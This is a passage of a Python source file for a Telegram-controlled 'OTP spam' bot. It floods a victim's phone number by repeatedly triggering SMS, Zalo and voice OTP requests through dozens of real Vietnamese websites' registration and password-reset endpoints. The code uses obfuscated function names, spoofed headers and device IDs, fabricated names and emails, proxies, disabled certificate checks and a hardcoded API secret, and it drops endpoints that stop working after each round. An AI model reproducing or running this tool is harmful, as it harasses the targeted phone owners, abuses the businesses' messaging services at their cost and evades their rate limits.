        r = req("POST", 'https://api-omni.mutosi.com/client/auth/reset-password/send-phone',
            headers={'Accept':'application/json','Content-Type':'application/json',
                     'Origin':'https://mutosi.com','Referer':'https://mutosi.com/','User-Agent':UA},
            json={'phone':sdt,'source':'web_consumers'})
        if r.status_code == 200: ok("mutosi.com-v2", "MMNMMNMMMNNMNNNMNNN")
        else: fail("mutosi.com-v2", r.status_code)
    except Exception: fail("mutosi.com-v2")

def WWXXWWXWWXXWWXWWWWW(sdt):
    try:
        r = req("POST", 'https://vietair.com.vn/Handler/CoreHandler.ashx',
            headers={'accept':'application/json',
                     'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
                     'Origin':'https://vietair.com.vn',
                     'Referer':f'https://vietair.com.vn/khach-hang-than-quen/xac-nhan-otp-dang-ky?mobile={sdt}',
                     'User-Agent':UA,'X-Requested-With':'XMLHttpRequest'},
            data={'op':'PACKAGE_HTTP_POST','path_ajax_post':'/service03/sms/get',
                  'package_name':'PK_FD_SMS_OTP','object_name':'INS',
                  'P_MOBILE':sdt,'P_TYPE_ACTIVE_CODE':'DANG_KY_NHAN_OTP'})
        if r.status_code == 200: ok("vietair.com.vn", "WWXXWWXWWXXWWXWWWWW")
        else: fail("vietair.com.vn", r.status_code)
    except Exception: fail("vietair.com.vn")

def IILLILJLLLJLIJIJJ(sdt):
    try:
        r = req("POST", 'https://www.fahasa.com/ajaxlogin/ajax/checkPhone',
            headers={'accept':'application/json',
                     'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
                     'Origin':'https://www.fahasa.com',
                     'Referer':'https://www.fahasa.com/customer/account/login',
                     'User-Agent':UA,'X-Requested-With':'XMLHttpRequest'},
            data={'phone':sdt})
        if r.status_code == 200: ok("fahasa.com", "IILLILJLLLJLIJIJJ")
        else: fail("fahasa.com", r.status_code)
    except Exception: fail("fahasa.com")

def jijiijjijllijijji(sdt):
    try:
        r = req("POST", 'https://shopiness.vn/ajax/user',
            headers={'Accept':'*/*','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
                     'Origin':'https://shopiness.vn','Referer':'https://shopiness.vn/',
                     'User-Agent':UA,'X-Requested-With':'XMLHttpRequest'},
            data={'action':'verify-registration-info','phoneNumber':sdt,'refCode':''})
        if r.status_code == 200: ok("shopiness.vn", "jijiijjijllijijji")
        else: fail("shopiness.vn", r.status_code)
    except Exception: fail("shopiness.vn")

def WXWWXWXWWWWWXXWWXXWXW(sdt):
    try:
        r = req("POST", 'https://v2sslapimocha35.mocha.com.vn/ReengBackendBiz/genotp/v32',
            headers={'User-Agent':'mocha/1.28 (iPhone; iOS 17.0.2; Scale/3.00)',
                     'Content-Type':'application/x-www-form-urlencoded','uuid':rand_id(36),
                     'APPNAME':'MC35','countryCode':'VN','languageCode':'vi',
                     'Accept-Language':'vi-VN;q=1'},
            data=f'clientType=ios&countryCode=VN&device=iPhone15%2C3&os_version=iOS_17.0.2&platform=ios&revision=11224&username={sdt}&version=1.28')
        if r.status_code == 200: ok("mocha35", "WXWWXWXWWWWWXXWWXXWXW")
        else: fail("mocha35", r.status_code)
    except Exception: fail("mocha35")

def OOooDOOoOODOOOoDOoOo(sdt):
    try:
        r = req("GET", 'https://moca.vn/moca/v2/users/role',
            params={'phoneNumber':sdt},
            headers={'User-Agent':'Pass/2.10.156 (iPhone; iOS 17.0.2; Scale/3.00)',
                     'device-token':rand_id(36),'device-id':rand_id(64),'accept-language':'vi',
                     'x-moca-api-version':'2','platform':'P_IOS-2.10.156',
                     'x-requested-with':'XMLHttpRequest'})
        if r.status_code == 200: ok("moca.vn", "OOooDOOoOODOOOoDOoOo")
        else: fail("moca.vn", r.status_code)
    except Exception: fail("moca.vn")

def ljlljjlljiiiljljjlij(sdt):
    try:
        r = req("POST", 'https://api.suplo.vn/v1/auth/customer/otp/sms/generate',
            params={'domain':'pantiofashion.myharavan.com'},
            headers={'accept':'*/*','content-type':'application/x-www-form-urlencoded; charset=UTF-8',
                     'origin':'https://pantio.vn','referer':'https://pantio.vn/','user-agent':UA},
            data={'phoneNumber':sdt})
        if r.status_code in (200, 201): ok("pantio.vn", "ljlljjlljiiiljljjlij")
        else: fail("pantio.vn", r.status_code)
    except Exception: fail("pantio.vn")

def SS22SSSS22222S2SS2S2S(sdt):
    try:
        r = req("POST", 'https://routine.vn/customer/otp/send/',
            headers={'accept':'application/json',
                     'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
                     'Origin':'https://routine.vn','Referer':'https://routine.vn/',
                     'User-Agent':UA,'X-Requested-With':'XMLHttpRequest'},
            data={'telephone':sdt,'isForgotPassword':'0'})
        if r.status_code == 200: ok("routine.vn", "SS22SSSS22222S2SS2S2S")
        else: fail("routine.vn", r.status_code)
    except Exception: fail("routine.vn")

def jjliliijiijijllijlll(sdt):
    try:
        r = req("POST", 'https://tima.vn/Borrower/RegisterLoanCreditFast',
            headers={'accept':'text/html','Content-Type':'application/x-www-form-urlencoded',
                     'Origin':'https://tima.vn','Referer':'https://tima.vn/vay-tien-online/','User-Agent':UA},
            data={'application_full_name':rand_name(),'application_mobile_phone':sdt,
                  'CityId':'1','DistrictId':'16','rules':'true','TypeTime':'1',
                  'application_amount':'0','application_term':'0','UsertAgent':UA,
                  'IsApply':'1','ProvinceName':'Hà Nội','DistrictName':'Sóc Sơn','product_id':'2'})
        if r.status_code == 200: ok("tima.vn", "jjliliijiijijllijlll")
        else: fail("tima.vn", r.status_code)
    except Exception: fail("tima.vn")

def lIllIlIIlllIllllIIIII(sdt):
    try:
        r1 = req("POST", 'https://auth.pico.vn/user/api/auth/register',
            headers={'accept':'*/*','content-type':'application/json','origin':'https://pico.vn',
                     'referer':'https://pico.vn/','user-agent':UA,'region-code':'MB'},
            json={'name':rand_name(),'phone':sdt,'provinceCode':'92','districtCode':'925',
                  'wardCode':'31261','address':'123'})
        r2 = req("POST", 'https://auth.pico.vn/user/api/auth/login/request-otp',
            headers={'accept':'application/json','content-type':'application/json',
                     'access':'206f5b6838b4e357e98bf68dbb8cdea5','channel':'b2c','party':'ecom',
                     'platform':'Desktop','origin':'https://pico.vn','referer':'https://pico.vn/',
                     'user-agent':UA,'region-code':'MB','uuid':rand_id(32)},
            json={'phone':sdt})
        if r2.status_code == 200: ok("pico.vn", "lIllIlIIlllIllllIIIII")
    except Exception: fail("pico.vn")

def MNMNNNNNNNNMNMNMNNMMNM(sdt):
    try:
        r = req("POST", 'https://www.pnj.com.vn/customer/otp/request',
            headers={'accept':'text/html','Content-Type':'application/x-www-form-urlencoded',
                     'Origin':'https://www.pnj.com.vn','Referer':'https://www.pnj.com.vn/customer/login',
                     'User-Agent':UA},
            data={'_method':'POST','_token':rand_id(40),'type':'zns','phone':sdt})
        if r.status_code == 200: ok("pnj.com.vn", "MNMNNNNNNNNMNMNMNNMMNM")
        else: fail("pnj.com.vn", r.status_code)
    except Exception: fail("pnj.com.vn")

def JLLLLILLJIILJLIILIIJIJLJ(sdt):
    try:
        r = req("POST", 'https://prod-tini-id.nkidworks.com/auth/tinizen',
            headers={'accept':'text/html','Content-Type':'application/x-www-form-urlencoded',
                     'Origin':'https://prod-tini-id.nkidworks.com',
                     'Referer':'https://prod-tini-id.nkidworks.com/login','User-Agent':UA},
            data={'_csrf':'','clientId':'609168b9f8d5275ea1e262d6',
                  'redirectUrl':'https://tiniworld.com','phone':sdt})
        if r.status_code == 200: ok("tiniworld.com", "JLLLLILLJIILJLIILIIJIJLJ")
        else: fail("tiniworld.com", r.status_code)
    except Exception: fail("tiniworld.com")

def xwwwxwxwxxxxwwwxxxw(sdt):
    try:
        r = req("POST", 'https://lk.takomo.vn/api/4/client/otp/send',
            headers={'accept':'application/json','content-type':'application/json;charset=UTF-8',
                     'origin':'https://lk.takomo.vn','referer':'https://lk.takomo.vn/','user-agent':UA},
            json={'data':{'phone':sdt,'code':'resend','channel':'ivr'}})
        if r.status_code == 200: ok("takomo.vn", "xwwwxwxwxxxxwwwxxxw")
        else: fail("takomo.vn", r.status_code)
    except Exception: fail("takomo.vn")

def nmnmnnmmmmnmmnnnnnnmnnmn(sdt):
    try:
        r = req("POST", 'https://merchant.paynetone.vn/User/GetOTP',
            headers={'Accept':'application/json',
                     'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
                     'Origin':'https://merchant.paynetone.vn',
                     'Referer':'https://merchant.paynetone.vn/User/Create',
                     'User-Agent':UA,'X-Requested-With':'XMLHttpRequest'},
            data={'MobileNumber':sdt,'IsForget':'N'})
        if r.status_code == 200: ok("paynetone.vn", "nmnmnnmmmmnmmnnnnnnmnnmn")
        else: fail("paynetone.vn", r.status_code)
    except Exception: fail("paynetone.vn")

def VAYVND_NET(sdt):
    try:
        headers = {'accept':'application/json','content-type':'application/json',
                   'origin':'https://vayvnd.net','referer':'https://vayvnd.net/',
                   'site-locale':'vn','user-agent':UA,'x-requested-with':'XMLHttpRequest',
                   'sec-fetch-site':'same-site'}
        json_data = {
            'cpaId': 32,
            'cpaLeadData': {'click_id': rand_id(32), 'utm_campaign': '135419'},
            'utm': [{'utm_source':'leadgid','utm_campaign':'135419',
                     'captured_at': time.strftime('%Y-%m-%dT%H:%M:%S.000Z')}],
            'otpRequestType': 'INITIAL', 'phone': sdt, 'trackingId': rand_id(64).lower(),
        }
        r = req("POST", 'https://api.vayvnd.net/v2/login', headers=headers, json=json_data)
        if r.status_code == 200: ok("vayvnd.net", "VAYVND_NET")
        else: fail("vayvnd.net", r.status_code)
    except Exception: fail("vayvnd.net")

def SAPO_ACCOUNTS(sdt):
    try:
        headers = {'accept':'application/json, text/javascript, */*; q=0.01',
                   'content-type':'application/json','origin':'https://accounts.sapo.vn',
                   'referer':'https://accounts.sapo.vn/register/confirm',
                   'user-agent':UA,'x-requested-with':'XMLHttpRequest'}
        json_data = {'country_code':'84','phone_number':sdt,
                     'type':'REQUEST_REGISTER','register_token':rand_id(36)}
        r = req("POST", 'https://accounts.sapo.vn/otp/get_last', headers=headers, json=json_data)
        if r.status_code == 200: ok("accounts.sapo.vn", "SAPO_ACCOUNTS")
        else: fail("accounts.sapo.vn", r.status_code)
    except Exception: fail("accounts.sapo.vn")

def SSI_IBOARD(sdt):
    try:
        headers = {'accept':'application/json, text/plain, */*','content-type':'application/json',
                   'device-id':rand_id(36),'origin':'https://iboard.ssi.com.vn',
                   'referer':'https://iboard.ssi.com.vn/','user-agent':UA,
                   'x-device-name':'Chrome','x-os-name':'Windows','sec-fetch-site':'same-site'}
        json_data = {'mobile':sdt,'email':f'{rand_id(8).lower()}@gmail.com',
                     'referralCode':'','utmSource':'internal_link','utmMedium':'website_button',
                     'utmCampaign':None}
        r = req("POST", 'https://iboard-tapi.ssi.com.vn/authentication/api/v1/verify-non-trading-user-v2',
                  headers=headers, json=json_data)
        if r.status_code == 200: ok("ssi.com.vn", "SSI_IBOARD")
        else: fail("ssi.com.vn", r.status_code)
    except Exception: fail("ssi.com.vn")

def VIETTELSTORE_SMS(sdt):
    try:
        cookies = {'ASP.NET_SessionId': rand_id(24).lower(),'_utm_source':'Online','INST':'W4'}
        headers = {'accept':'*/*','content-type':'application/x-www-form-urlencoded; charset=UTF-8',
                   'origin':'https://viettelstore.vn','referer':'https://viettelstore.vn/khach-hang/dang-ky.html',
                   'user-agent':UA,'x-requested-with':'XMLHttpRequest','sec-fetch-site':'same-origin'}
        data = {'a':'customer-service','methodName':'POST',
                'path':'/profile/v1/customer/register/otp/send','withAuth':'false',
                'requestBody': json.dumps({'phoneNumber': sdt, 'channel': 'CARRIER'})}
        r = req("POST", 'https://viettelstore.vn/Site/_Sys/Ajax.aspx',
                  cookies=cookies, headers=headers, data=data)
        if r.status_code == 200: ok("viettelstore.vn-sms", "VIETTELSTORE_SMS")
        else: fail("viettelstore.vn-sms", r.status_code)
    except Exception: fail("viettelstore.vn-sms")

def VIETTELSTORE_ZALO(sdt):
    try:
        cookies = {'ASP.NET_SessionId': rand_id(24).lower(),'_utm_source':'Online','INST':'W4'}
        headers = {'accept':'*/*','content-type':'application/x-www-form-urlencoded; charset=UTF-8',
                   'origin':'https://viettelstore.vn','referer':'https://viettelstore.vn/khach-hang/dang-ky.html',
                   'user-agent':UA,'x-requested-with':'XMLHttpRequest','sec-fetch-site':'same-origin'}
        data = {'a':'customer-service','methodName':'POST',
                'path':'/profile/v1/customer/register/otp/send','withAuth':'false',
                'requestBody': json.dumps({'phoneNumber': sdt, 'channel': 'ZALO'})}
        r = req("POST", 'https://viettelstore.vn/Site/_Sys/Ajax.aspx',
                  cookies=cookies, headers=headers, data=data)
        if r.status_code == 200: ok("viettelstore.vn-zalo", "VIETTELSTORE_ZALO")
        else: fail("viettelstore.vn-zalo", r.status_code)
    except Exception: fail("viettelstore.vn-zalo")

def KINGFOODMART_ZALO(sdt):
    try:
        headers = {
            'sec-ch-ua-platform': '"Windows"', 'X-Ol-Tenant': 'kingfood',
            'Referer': 'https://kingfoodmart.com/',
            'sec-ch-ua': '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
            'sec-ch-ua-mobile': '?0', 'User-Agent': UA,
            'Accept': 'application/json, text/plain, */*', 'Content-Type': 'application/json',
        }
        r = req("POST", 'https://onelife-api.kingfoodmart.com/v1/auth/send-otp',
                  headers=headers, json={'phone': sdt, 'captchaSignature': '', 'method': 'ZALO'})
        if r.status_code == 200 and 'otpTrackingId' in r.text:
            ok("kingfoodmart.com-zalo", "KINGFOODMART_ZALO")
        elif 'INVALID_CAPTCHA' in r.text:
            fail("kingfoodmart.com-zalo", "captcha")
        else:
            fail("kingfoodmart.com-zalo", r.status_code)
    except Exception: fail("kingfoodmart.com-zalo")

def GUARDIAN(sdt):
    try:
        headers = {'accept':'application/json, text/plain, */*','content-type':'application/json',
                   'origin':'https://www.guardian.com.vn','referer':'https://www.guardian.com.vn/',
                   'user-agent':UA}
        r = req("POST", 'https://www.guardian.com.vn/rest/V1/smsOtp/generateOtpForNewAccount',
                  headers=headers, json={'telephone': sdt})
        if r.status_code == 200: ok("guardian.com.vn", "GUARDIAN")
        else: fail("guardian.com.vn", r.status_code)
    except Exception: fail("guardian.com.vn")

def NTTLC_ZALO(sdt):
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'vi,en;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6',
            'access-control-allow-origin': '*', 'content-type': 'application/json',
            'order-channel': '1', 'origin': 'https://nhathuoclongchau.com.vn',
            'referer': 'https://nhathuoclongchau.com.vn/', 'user-agent': UA, 'x-channel': 'EStore',
        }
        r = req("POST", 'https://api.nhathuoclongchau.com.vn/lccus/is/user/v2/send-verification',
                  headers=headers, json={'phoneNumber': sdt, 'otpType': 1, 'fromSys': 'WEBKHLC'})
        if r.status_code == 200: ok("nhathuoclongchau.com.vn-zalo", "NTTLC_ZALO")
        else: fail("nhathuoclongchau.com.vn-zalo", r.status_code)
    except Exception: fail("nhathuoclongchau.com.vn-zalo")

def HOANGPHUC_V2(sdt):
    try:
        s = requests.Session()
        s.verify = False
        px = get_proxy()
        if px: s.proxies = px
        r0 = s.get('https://hoangphuconline.vn/customer/account/login/',
                   headers={'user-agent': UA}, timeout=10)
        import re
        m = re.search(r'form_key["\']?\s*[:=]\s*["\']([^"\']+)', r0.text)
        form_key = m.group(1) if m else rand_id(16)
        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://hoangphuconline.vn',
            'referer': 'https://hoangphuconline.vn/customer/account/login/',
            'user-agent': UA, 'x-requested-with': 'XMLHttpRequest',
        }
        s.post('https://hoangphuconline.vn/advancedlogin/customer/validatePhone/',
               headers=headers, data={'telephone': sdt, 'action_type': '1'}, timeout=10)
        r2 = s.post('https://hoangphuconline.vn/advancedlogin/otp/CheckValiiid/',
                    headers=headers,
                    data={'action_type': '1', 'tel': sdt, 'channel': 'sms', 'form_key': form_key},
                    timeout=10)
        if r2.status_code == 200 and 'error' not in r2.text.lower():
            ok("hoangphuconline.vn", "HOANGPHUC_V2")
        else:
            fail("hoangphuconline.vn", r2.status_code)
    except Exception: fail("hoangphuconline.vn")

def BATDONGSAN_V2(sdt):
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'vi,en;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6',
            'access-control-allow-credentials': 'true',
            'access-control-allow-headers': 'Access-Control-Allow-Headers, Origin,Accept, X-Requested-With, Content-Type, Access-Control-Request-Method, Access-Control-Request-Headers',
            'access-control-allow-methods': 'GET,HEAD,OPTIONS,POST,PUT',
            'access-control-allow-origin': '*', 'apiversion': '2020-02-28 18:30',
            'cache-control': 'no-cache', 'origin': 'https://batdongsan.com.vn',
            'referer': 'https://batdongsan.com.vn/nguoi-ban/internal-sign-up',
            'sellernet-origin': 'tablet', 'uniqueid': 'deviceidfromweb', 'user-agent': UA,
        }
        r = req("GET",
            f'https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister?phoneNumber={sdt}',
            headers=headers)
        if r.status_code == 200: ok("batdongsan.com.vn", "BATDONGSAN_V2")
        elif r.status_code == 403: fail("batdongsan.com.vn", "cloudflare")
        else: fail("batdongsan.com.vn", r.status_code)
    except Exception: fail("batdongsan.com.vn")

def DOMINOS_V2(sdt):
    try:
        headers = {
            'accept': 'application/json, text/plain, */*', 'accept-language': 'vi',
            'content-type': 'application/json',
            'dmn': 'CXSPIG', 'secret': 'VmZic0AjQEtpbGxCaXR0bw==',
            'origin': 'https://dominos.vn', 'referer': 'https://dominos.vn/', 'user-agent': UA,
            'x-device-fingerprint': rand_id(64).lower(),
            'x-device-flags': '{"wd":0,"pl":5,"ch":1}', 'x-platform': 'web',
            'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty',
        }
        json_data = {'phone_number': sdt, 'email': f'{rand_id(10).lower()}@gmail.com',
                     'type': 0, 'is_register': True}
        r = req("POST", 'https://dominos.vn/api/v1/users/send-otp',
                  headers=headers, json=json_data)
        if r.status_code == 200: ok("dominos.vn", "DOMINOS_V2")
        elif r.status_code == 404: fail("dominos.vn", "dmn-header")
        else: fail("dominos.vn", r.status_code)
    except Exception: fail("dominos.vn")

# ============ LIST HÀM ============
ALL_FUNCTIONS = [
    XWXWWWXWWWXXXXXXWW, lIlIlllllllIllIlI, S2S22SS22SSSSSSSSS2SS, OODOOooDoOOoOoOooDD,
    JIILIILJJILJJILJIILLJILI, lIIllIlllIIllIIlIllI, DOOOOoDDDOODDDDoDooO,
    llIllIIIIlIlIIlIlIlll, NMMNNNMMNMMMMNNNM, GHN_V3, MNMNNNMNMNMNNNMMNNMN,
    Oo0oO0ooooo0O000O0ooO, LJIJIILJJJLIJLJJILJ, IlIIIlIlllIlIIlIlIllI,
    oOOoDDDDoOoDoOoooO, O00oOoOo0O0Oo0OO00OO0, WWWWWWXWXWXWXXWWW,
    xxwwwxwwwwxwxwwxxx, DOoODDDDOOoDooOODDODDDO, xwwwwxxxwxwwwxxwxxwxwwx,
    IIIIIIlIIIlIIIIlIllIIIlII, O0O0OOoOoO0oOoOOOOoo0oOOO0, DOooOoOOOODoODoooDO,
    S22SSS2SSSS22222SSS22, IIIIllllIllIIIIllIIIllI, mmnmmmnmmmmmmmnmmnnmnnmm,
    IIllIllIlllIlllII, mmnnmnmnnmmmnnmnmmmmm, lIIlllIIIllIIIlIIIIIll,
    jijjlljjjijjiiijjiilii, IJIILJILJLLLJJLLJLJILII, mmnmnnmnnnmmmnmmmnmnnmm,
    NTTLC_V2, WXXXXWXWWWXWWWXXWXWXXXXXX, MMNMMNMMMNNMNNNMNNN,
    WWXXWWXWWXXWWXWWWWW, IILLILJLLLJLIJIJJ, jijiijjijllijijji,
    WXWWXWXWWWWWXXWWXXWXW, OOooDOOoOODOOOoDOoOo, DOMINOS_V2,
    ljlljjlljiiiljljjlij, SS22SSSS22222S2SS2S2S, jjliliijiijijllijlll,
    lIllIlIIlllIllllIIIII, MNMNNNNNNNNMNMNMNNMMNM, JLLLLILLJIILJLIILIIJIJLJ,
    xwwwxwxwxxxxwwwxxxw, NTTLC_ZALO, HOANGPHUC_V2, BATDONGSAN_V2,
    VAYVND_NET, SAPO_ACCOUNTS, SSI_IBOARD,
    VIETTELSTORE_SMS, VIETTELSTORE_ZALO, GUARDIAN, KINGFOODMART_ZALO,
]

# ============ BOT LOGIC ============
bot_state = {
    "running": False,
    "sdt": None,
    "total_rounds": 0,
    "current_round": 0,
    "active_funcs": [],
    "thread": None,
    "stop_flag": False,
}

def _safe_call(fn, sdt):
    try:
        fn(sdt)
    except Exception:
        pass

def run_spam_loop(sdt, total_rounds, delay_req_min, delay_req_max,
                  delay_round_min, delay_round_max, chat_id):
    global bot_state

    bot_state["running"] = True
    bot_state["stop_flag"] = False
    bot_state["sdt"] = sdt
    bot_state["total_rounds"] = total_rounds
    bot_state["current_round"] = 0
    bot_state["active_funcs"] = ALL_FUNCTIONS[:]

    tg_send(chat_id, f"🚀 BẮT ĐẦU SPAM\n"
                     f"📱 SĐT: {sdt}\n"
                     f"🔁 Số vòng: {total_rounds}\n"
                     f"⚙️ Hàm ban đầu: {len(ALL_FUNCTIONS)}\n"
                     f"🧵 Threads: {MAX_THREADS}\n"
                     f"🌐 Proxy: {len(PROXIES)}")

    active = ALL_FUNCTIONS[:]

    for i in range(1, total_rounds + 1):
        if bot_state["stop_flag"]:
            tg_send(chat_id, "⛔ Đã dừng theo yêu cầu.")
            break

        if not active:
            tg_send(chat_id, "⚠️ Hết hàm sống. Dừng tool.")
            break

        bot_state["current_round"] = i
        with _success_lock:
            _current_success.clear()

        tg_send(chat_id, f"┌─ ROUND {i}/{total_rounds} ── {len(active)} hàm ──")

        with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_THREADS) as ex:
            futs = []
            for fn in active:
                if delay_req_max > 0:
                    time.sleep(random.uniform(delay_req_min, delay_req_max))
                futs.append(ex.submit(_safe_call, fn, sdt))
            for f in concurrent.futures.as_completed(futs):
                pass

        alive = [fn for fn in active if fn.__name__ in _current_success]
        tg_send(chat_id, f"└─ ROUND {i} xong ── Sống: {len(alive)}/{len(active)}")

        if not alive:
            tg_send(chat_id, "⚠️ Không còn hàm nào gửi được. Dừng.")
            break

        if len(alive) < len(active):
            tg_send(chat_id, f"🔎 Lọc bỏ {len(active)-len(alive)} hàm chết. Còn {len(alive)} hàm.")
        active = alive
        bot_state["active_funcs"] = active

        delay = random.randint(delay_round_min, delay_round_max)
        time.sleep(delay)

    tg_send(chat_id, f"✅ HOÀN TẤT\n"
                     f"📱 SĐT: {sdt}\n"
                     f"🔁 Đã chạy: {bot_state['current_round']}/{total_rounds}\n"
                     f"💚 Hàm còn sống: {len(bot_state['active_funcs'])}")
    bot_state["running"] = False

# ============ TELEGRAM POLLING ============
def tg_get_updates(offset=None):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
    params = {"timeout": 30}
    if offset:
        params["offset"] = offset
    try:
        r = requests.get(url, params=params, timeout=35).json()
        return r.get("result", [])
    except Exception:
        return []

def handle_command(msg):
    chat_id = msg["chat"]["id"]
    user_id = msg["from"]["id"]
    text = (msg.get("text") or "").strip()

    # Chỉ cho admin dùng
    if TELEGRAM_ADMIN_ID and user_id != TELEGRAM_ADMIN_ID:
        tg_send(chat_id, "⛔ Bạn không có quyền dùng bot này.")
        return

    # ====== XÁC THỰC KEY ======
    if not is_key_verified():
        # Nếu chưa xác thực và text khác key → yêu cầu nhập key
        if text != DEFAULT_KEY:
            tg_send(chat_id,
                "🔒 BOT CHƯA ĐƯỢC KÍCH HOẠT\n\n"
                "Gửi key để bắt đầu:\n"
                f"Key mặc định: `{DEFAULT_KEY}`",
                parse_mode="Markdown")
            return
        else:
            # Nhập đúng key
            save_verified()
            tg_send(chat_id,
                "✅ KÍCH HOẠT THÀNH CÔNG\n\n"
                "Gõ /start để xem menu lệnh.")
            return

    # ====== MENU SAU KHI ĐÃ XÁC THỰC ======
    if text == "/start":
        tg_send(chat_id,
            "🤖 BOT SPAM OTP — Gzii\n\n"
            "📌 Lệnh:\n"
            "/spam <sđt> <số_vòng> — Bắt đầu spam\n"
            "/stop — Dừng spam\n"
            "/status — Xem trạng thái\n"
            "/proxy — Xem số proxy\n"
            "/help — Trợ giúp"
        )
        return

    if text.startswith("/spam"):
        if bot_state["running"]:
            tg_send(chat_id, "⚠️ Đang chạy rồi. Dùng /stop trước.")
            return
        parts = text.split()
        if len(parts) < 2:
            tg_send(chat_id, "❌ Cú pháp: /spam <sđt> [số_vòng]\nVí dụ: /spam 0343458245 100")
            return
        sdt = parts[1].strip()
        try:
            rounds = int(parts[2]) if len(parts) > 2 else 100
        except ValueError:
            rounds = 100

        bot_state["thread"] = threading.Thread(
            target=run_spam_loop,
            args=(sdt, rounds, 0.3, 1.0, 5, 10, chat_id),
            daemon=True
        )
        bot_state["thread"].start()
        return

    if text == "/stop":
        if bot_state["running"]:
            bot_state["stop_flag"] = True
            tg_send(chat_id, "⛔ Đã gửi tín hiệu dừng. Chờ round hiện tại xong...")
        else:
            tg_send(chat_id, "ℹ️ Bot không chạy.")
        return

    if text == "/status":
        if bot_state["running"]:
            tg_send(chat_id,
                f"🟢 ĐANG CHẠY\n"
                f"📱 SĐT: {bot_state['sdt']}\n"
                f"🔁 Round: {bot_state['current_round']}/{bot_state['total_rounds']}\n"
                f"💚 Hàm sống: {len(bot_state['active_funcs'])}"
            )
        else:
            tg_send(chat_id, "🔴 Bot đang rảnh.")
        return

    if text == "/proxy":
        tg_send(chat_id, f"🌐 Proxy: {len(PROXIES)} cái")
        return

    if text == "/help":
        tg_send(chat_id,
            "📖 HƯỚNG DẪN\n\n"
            "1️⃣ Gửi key mặc định để kích hoạt\n"
            "2️⃣ /spam <sđt> <số_vòng> để bắt đầu\n"
            "3️⃣ /status xem tiến độ\n"
            "4️⃣ /stop để dừng\n\n"
            "⚙️ Delay mặc định: 0.3-1s/request, 5-10s/round"
        )
        return

# ============ MAIN ============
if __name__ == "__main__":
    print(f"[*] Bot đang khởi động... Token: {TELEGRAM_BOT_TOKEN[:20]}...")
    if not TELEGRAM_BOT_TOKEN or TELEGRAM_BOT_TOKEN == "DÁN_TOKEN_BOT_TELEGRAM_VÀO_ĐÂY":
        print("[!] Chưa điền TELEGRAM_BOT_TOKEN")
        sys.exit(1)

    if TELEGRAM_ADMIN_ID:
        status = "đã xác thực" if is_key_verified() else "chưa xác thực"
        tg_send(TELEGRAM_ADMIN_ID, f"🤖 Bot đã online!\nKey: {status}")

    last_update_id = None
    print("[✓] Bot đang chạy. Nhấn Ctrl+C để dừng.")
    while True:
        try:
            updates = tg_get_updates(last_update_id)
            for upd in updates:
                last_update_id = upd["update_id"] + 1
                if "message" in upd:
                    handle_command(upd["message"])
        except KeyboardInterrupt:
            print("\n[*] Bot dừng.")
            break
        except Exception as e:
            print(f"[!] Lỗi polling: {e}")
            time.sleep(3)
